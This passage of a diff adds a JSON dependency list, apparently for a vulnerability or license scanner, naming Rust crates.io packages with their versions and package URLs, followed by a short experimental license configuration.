+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/serde_json@1.0.154"
+          }
+        },
+        {
+          "package": {
+            "name": "serde_urlencoded",
+            "version": "0.7.1",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/serde_urlencoded@0.7.1"
+          }
+        },
+        {
+          "package": {
+            "name": "shlex",
+            "version": "2.0.1",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/shlex@2.0.1"
+          }
+        },
+        {
+          "package": {
+            "name": "simple_asn1",
+            "version": "0.6.4",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/simple_asn1@0.6.4"
+          }
+        },
+        {
+          "package": {
+            "name": "slab",
+            "version": "0.4.12",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/slab@0.4.12"
+          }
+        },
+        {
+          "package": {
+            "name": "smallvec",
+            "version": "1.16.5",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/smallvec@1.16.5"
+          }
+        },
+        {
+          "package": {
+            "name": "socket2",
+            "version": "0.6.5",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/socket2@0.6.5"
+          }
+        },
+        {
+          "package": {
+            "name": "stable_deref_trait",
+            "version": "1.2.1",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/stable_deref_trait@1.2.1"
+          }
+        },
+        {
+          "package": {
+            "name": "subtle",
+            "version": "2.6.1",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/subtle@2.6.1"
+          }
+        },
+        {
+          "package": {
+            "name": "syn",
+            "version": "3.0.10",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/syn@3.0.10"
+          }
+        },
+        {
+          "package": {
+            "name": "sync_wrapper",
+            "version": "1.0.2",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/sync_wrapper@1.0.2"
+          }
+        },
+        {
+          "package": {
+            "name": "synstructure",
+            "version": "0.14.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/synstructure@0.14.0"
+          }
+        },
+        {
+          "package": {
+            "name": "thiserror",
+            "version": "2.0.21",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/thiserror@2.0.21"
+          }
+        },
+        {
+          "package": {
+            "name": "thiserror-impl",
+            "version": "2.0.21",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/thiserror-impl@2.0.21"
+          }
+        },
+        {
+          "package": {
+            "name": "time",
+            "version": "0.3.55",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/time@0.3.55"
+          }
+        },
+        {
+          "package": {
+            "name": "time-core",
+            "version": "0.1.9",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/time-core@0.1.9"
+          }
+        },
+        {
+          "package": {
+            "name": "time-macros",
+            "version": "0.2.32",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/time-macros@0.2.32"
+          }
+        },
+        {
+          "package": {
+            "name": "tinystr",
+            "version": "0.8.5",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/tinystr@0.8.5"
+          }
+        },
+        {
+          "package": {
+            "name": "tinyvec",
+            "version": "1.13.3",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/tinyvec@1.13.3"
+          }
+        },
+        {
+          "package": {
+            "name": "tokio",
+            "version": "1.54.1",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/tokio@1.54.1"
+          }
+        },
+        {
+          "package": {
+            "name": "tokio-rustls",
+            "version": "0.26.6",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/tokio-rustls@0.26.6"
+          }
+        },
+        {
+          "package": {
+            "name": "tower",
+            "version": "0.5.3",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/tower@0.5.3"
+          }
+        },
+        {
+          "package": {
+            "name": "tower-http",
+            "version": "0.6.11",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/tower-http@0.6.11"
+          }
+        },
+        {
+          "package": {
+            "name": "tower-layer",
+            "version": "0.3.3",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/tower-layer@0.3.3"
+          }
+        },
+        {
+          "package": {
+            "name": "tower-service",
+            "version": "0.3.3",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/tower-service@0.3.3"
+          }
+        },
+        {
+          "package": {
+            "name": "tracing",
+            "version": "0.1.44",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/tracing@0.1.44"
+          }
+        },
+        {
+          "package": {
+            "name": "tracing-core",
+            "version": "0.1.36",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/tracing-core@0.1.36"
+          }
+        },
+        {
+          "package": {
+            "name": "try-lock",
+            "version": "0.2.5",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/try-lock@0.2.5"
+          }
+        },
+        {
+          "package": {
+            "name": "unicode-ident",
+            "version": "1.0.27",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/unicode-ident@1.0.27"
+          }
+        },
+        {
+          "package": {
+            "name": "untrusted",
+            "version": "0.9.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/untrusted@0.9.0"
+          }
+        },
+        {
+          "package": {
+            "name": "url",
+            "version": "2.5.8",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/url@2.5.8"
+          }
+        },
+        {
+          "package": {
+            "name": "utf8_iter",
+            "version": "1.1.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/utf8_iter@1.1.0"
+          }
+        },
+        {
+          "package": {
+            "name": "utf_types",
+            "version": "1.0.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/utf_types@1.0.0"
+          }
+        },
+        {
+          "package": {
+            "name": "want",
+            "version": "0.3.2",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/want@0.3.2"
+          }
+        },
+        {
+          "package": {
+            "name": "wasi",
+            "version": "0.11.1+wasi-snapshot-preview1",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/wasi@0.11.1%2Bwasi-snapshot-preview1"
+          }
+        },
+        {
+          "package": {
+            "name": "wasm-bindgen",
+            "version": "0.2.130",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/wasm-bindgen@0.2.130"
+          }
+        },
+        {
+          "package": {
+            "name": "wasm-bindgen-futures",
+            "version": "0.4.80",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/wasm-bindgen-futures@0.4.80"
+          }
+        },
+        {
+          "package": {
+            "name": "wasm-bindgen-macro",
+            "version": "0.2.130",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/wasm-bindgen-macro@0.2.130"
+          }
+        },
+        {
+          "package": {
+            "name": "wasm-bindgen-macro-support",
+            "version": "0.2.130",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/wasm-bindgen-macro-support@0.2.130"
+          }
+        },
+        {
+          "package": {
+            "name": "wasm-bindgen-shared",
+            "version": "0.2.130",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/wasm-bindgen-shared@0.2.130"
+          }
+        },
+        {
+          "package": {
+            "name": "web-sys",
+            "version": "0.3.107",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/web-sys@0.3.107"
+          }
+        },
+        {
+          "package": {
+            "name": "web-time",
+            "version": "1.1.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/web-time@1.1.0"
+          }
+        },
+        {
+          "package": {
+            "name": "webpki-roots",
+            "version": "1.0.12",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/webpki-roots@1.0.12"
+          }
+        },
+        {
+          "package": {
+            "name": "windows-link",
+            "version": "0.2.1",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/windows-link@0.2.1"
+          }
+        },
+        {
+          "package": {
+            "name": "windows-sys",
+            "version": "0.52.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/windows-sys@0.52.0"
+          }
+        },
+        {
+          "package": {
+            "name": "windows-sys",
+            "version": "0.61.2",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/windows-sys@0.61.2"
+          }
+        },
+        {
+          "package": {
+            "name": "windows-targets",
+            "version": "0.52.6",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/windows-targets@0.52.6"
+          }
+        },
+        {
+          "package": {
+            "name": "windows_aarch64_gnullvm",
+            "version": "0.52.6",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/windows_aarch64_gnullvm@0.52.6"
+          }
+        },
+        {
+          "package": {
+            "name": "windows_aarch64_msvc",
+            "version": "0.52.6",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/windows_aarch64_msvc@0.52.6"
+          }
+        },
+        {
+          "package": {
+            "name": "windows_i686_gnu",
+            "version": "0.52.6",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/windows_i686_gnu@0.52.6"
+          }
+        },
+        {
+          "package": {
+            "name": "windows_i686_gnullvm",
+            "version": "0.52.6",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/windows_i686_gnullvm@0.52.6"
+          }
+        },
+        {
+          "package": {
+            "name": "windows_i686_msvc",
+            "version": "0.52.6",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/windows_i686_msvc@0.52.6"
+          }
+        },
+        {
+          "package": {
+            "name": "windows_x86_64_gnu",
+            "version": "0.52.6",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/windows_x86_64_gnu@0.52.6"
+          }
+        },
+        {
+          "package": {
+            "name": "windows_x86_64_gnullvm",
+            "version": "0.52.6",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/windows_x86_64_gnullvm@0.52.6"
+          }
+        },
+        {
+          "package": {
+            "name": "windows_x86_64_msvc",
+            "version": "0.52.6",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/windows_x86_64_msvc@0.52.6"
+          }
+        },
+        {
+          "package": {
+            "name": "writeable",
+            "version": "0.6.4",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/writeable@0.6.4"
+          }
+        },
+        {
+          "package": {
+            "name": "yoke",
+            "version": "0.8.4",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/yoke@0.8.4"
+          }
+        },
+        {
+          "package": {
+            "name": "yoke-derive",
+            "version": "0.8.4",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/yoke-derive@0.8.4"
+          }
+        },
+        {
+          "package": {
+            "name": "zerofrom",
+            "version": "0.1.8",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/zerofrom@0.1.8"
+          }
+        },
+        {
+          "package": {
+            "name": "zerofrom-derive",
+            "version": "0.1.8",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/zerofrom-derive@0.1.8"
+          }
+        },
+        {
+          "package": {
+            "name": "zeroize",
+            "version": "1.9.1",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/zeroize@1.9.1"
+          }
+        },
+        {
+          "package": {
+            "name": "zerotrie",
+            "version": "0.2.5",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/zerotrie@0.2.5"
+          }
+        },
+        {
+          "package": {
+            "name": "zerovec",
+            "version": "0.11.9",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/zerovec@0.11.9"
+          }
+        },
+        {
+          "package": {
+            "name": "zerovec-derive",
+            "version": "0.11.7",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/zerovec-derive@0.11.7"
+          }
+        },
+        {
+          "package": {
+            "name": "zmij",
+            "version": "1.0.23",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/zmij@1.0.23"
+          }
+        }
+      ]
+    }
+  ],
+  "experimental_config": {
+    "licenses": {
+      "summary": false,
+      "allowlist": null
+    }
+  }
+}
